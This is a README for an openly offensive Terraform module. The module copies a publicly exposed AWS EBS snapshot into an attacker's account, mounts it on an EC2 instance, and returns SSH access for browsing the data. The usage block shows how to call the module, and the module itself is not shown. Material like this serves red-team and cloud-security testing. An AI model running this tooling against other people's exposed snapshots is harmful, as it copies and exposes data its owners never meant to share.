# AWS EBS Snapshot Publicly Exposed

![OffensiveTerraform](https://img.shields.io/badge/hack-success)
![OffensiveTerraform](https://img.shields.io/badge/offensive-terraform-blueviolet)
![OffensiveTerraform](https://img.shields.io/badge/aws-important)

Offensive Terraform module which copies publicly exposed EBS snapshot to us-east-1 region in attacker's AWS account and creates EBS volume from the copied EBS snapshot. After that, the module attaches and mounts the EBS volume to an EC2 instance. Finally, attacker can ssh into an EC2 instance and inspect a mounted volume "/usr/src/hack".

![Attack Diagram](https://raw.githubusercontent.com/offensive-terraform/terraform-aws-ebs-snapshot-publicly-exposed/master/diagram.jpg)

## Usage
```
module "ebs-snapshot-publicly-exposed" {
    source  = "offensive-terraform/ebs-snapshot-publicly-exposed/aws"

    public_snapshot_id = "snap-000000000000"
}

output "ssh_private_key" {
  value = module.ebs-snapshot-publicly-exposed.ssh_private_key
}

output "ssh_ec2_connect" {
  value = module.ebs-snapshot-publicly-exposed.ssh_ec2_connect
}

output "ebs_volume_mount_path" {
  value = module.ebs-snapshot-publicly-exposed.ebs_volume_mount_path
}
```

## Author
Module managed by https://github.com/iganbold
